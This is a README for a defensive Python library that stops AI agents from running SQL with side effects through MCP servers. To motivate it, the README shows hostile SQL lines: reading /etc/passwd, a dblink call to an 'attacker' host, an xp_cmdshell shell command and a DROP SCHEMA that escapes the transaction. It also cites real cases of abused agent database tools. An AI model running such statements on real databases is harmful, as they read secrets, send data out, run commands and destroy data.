# readonly-sql-guard

**A provably read-only SQL guard for AI agents — drop it into any MCP server or database tool.**

[![PyPI](https://img.shields.io/pypi/v/readonly-sql-guard)](https://pypi.org/project/readonly-sql-guard/)
[![CI](https://github.com/gulmezeren2-byte/readonly-sql-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/gulmezeren2-byte/readonly-sql-guard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

🇹🇷 Türkçesi: [README.tr.md](README.tr.md)

Most database MCP servers and text-to-SQL tools enforce "read-only" by checking a statement's **shape** — does it start with `SELECT`? does it contain the word `DELETE`? That is not enough. A perfectly well-formed `SELECT` can read a file, open a socket, run a shell, escape a read-only transaction, or flip the session:

```sql
SELECT pg_read_file('/etc/passwd')                       -- reads a server file
SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)  -- opens an outbound socket
SELECT * FROM orders; EXEC xp_cmdshell 'whoami'          -- SQL Server shell
COMMIT; DROP SCHEMA public CASCADE;                      -- escapes the read-only transaction
```

The first two of those, in real MCP servers, got [Anthropic's reference Postgres server archived](https://github.com/modelcontextprotocol/servers-archived/tree/HEAD/src/postgres) and turned Supabase's MCP into the textbook ["lethal trifecta"](https://simonwillison.net/2025/Jul/6/supabase-mcp-lethal-trifecta/). This library checks the functions a statement **calls**, not just its shape — and proves it.

## Read-only is a number here, not an adjective

`readonly-sql-guard benchmark` runs 28 well-formed-SQL attacks (including the two above by name) and 8 legitimate reads, and runs the **same corpus** through the shortcuts other tools ship, so you can see the gap:

| Guard | Attacks refused | Legit reads allowed |
|---|---|---|
| starts-with-`SELECT` check | **6 / 28** | 8 / 8 |
| write-keyword blocklist | **9 / 28** | 7 / 8 *(blocks a read whose string contains "delete")* |
| **this guard** | **28 / 28** | **8 / 8** |

Every number is computed from a live run. Paste your own attack into the [in-browser playground](https://gulmezeren2-byte.github.io/erp-report-engine/playground.html) (the same guard, via Pyodide, nothing sent anywhere).

## Install

```bash
pip install readonly-sql-guard      # or: uv add readonly-sql-guard
```

Its only dependency is [`sqlglot`](https://github.com/tobymao/sqlglot).

## Use

```python
from readonly_sql_guard import assert_read_only, ReadOnlyViolation

assert_read_only("SELECT customer, SUM(net_total) FROM orders GROUP BY customer", dialect="postgres")
# returns None — it's a read

assert_read_only("SELECT pg_read_file('/etc/passwd')", dialect="postgres")
# raises ReadOnlyViolation: function pg_read_file() is not a read ...
```

For SQL you did **not** write yourself — anything an agent or a user supplied — use **strict mode**, which additionally default-denies every function the parser cannot name:

```python
try:
    assert_read_only(agent_sql, dialect="postgres", strict=True)
except ReadOnlyViolation as e:
    return f"refused: {e}"          # never reaches the database
rows = cursor.execute(agent_sql)    # now safe to run
```

`dialect` accepts `postgres` / `mysql` / `tsql` (or `mssql`/`sqlserver`) / `sqlite`, and a few aliases; `None` parses dialect-agnostically. There is also `is_read_only(sql, ...) -> bool` if you prefer not to catch.

## In an MCP server

```python
@server.tool()
def query(sql: str) -> dict:
    assert_read_only(sql, dialect="postgres", strict=True)   # raises before we touch the DB
    return {"rows": run_query(sql)}
```

## How it holds

Read-only is enforced in layers, and each is precise about the guarantee it carries:

1. **Lexical** — over the statement with string literals blanked out (a keyword inside a quoted value is data, not code): single statement, `SELECT`/`WITH` head, no comments, no write/DDL keyword, no write-escalating lock hint, no call to a side-effecting function.
2. **Parse-tree (`sqlglot`)** — the statement **must parse**, or it is refused (a guard that cannot read a query cannot vouch for it — and `OPENROWSET` is precisely what fails to parse). It must be a single read query with no `INSERT`/`UPDATE`/`DELETE`/DDL/`EXEC`/`INTO` node, and call no denylisted function.
3. **Strict mode** — additionally refuses every function `sqlglot` cannot name. Its function registry is the allowlist: it knows the portable analytic functions and nothing that reads a file or dials out.

The guard is **fuzzed** (hypothesis), so a denylisted function is refused however it is cased, spaced, or argumented — it does not pass by memorising the corpus.

> **This is defence in depth, not a substitute for a least-privilege database login.** A denylist is never provably complete; run your queries under a read-only DB role as well. The session layer (a read-only transaction, the login itself) is a property of the *connection*, so it is out of scope for a pure SQL-string guard — this library is the layer that inspects the statement.

## Reproduce it

```bash
readonly-sql-guard benchmark          # the table above, computed live
readonly-sql-guard check "SELECT 1" --dialect postgres
```

## Where this comes from

This is the read-only guard extracted from [**erp-report-engine**](https://github.com/gulmezeren2-byte/erp-report-engine) — a read-only reporting and MCP layer for the database behind an ERP — generalised so any tool can adopt it. That project is the flagship instantiation; this is the reusable primitive.

## License

MIT © Eren Gülmez
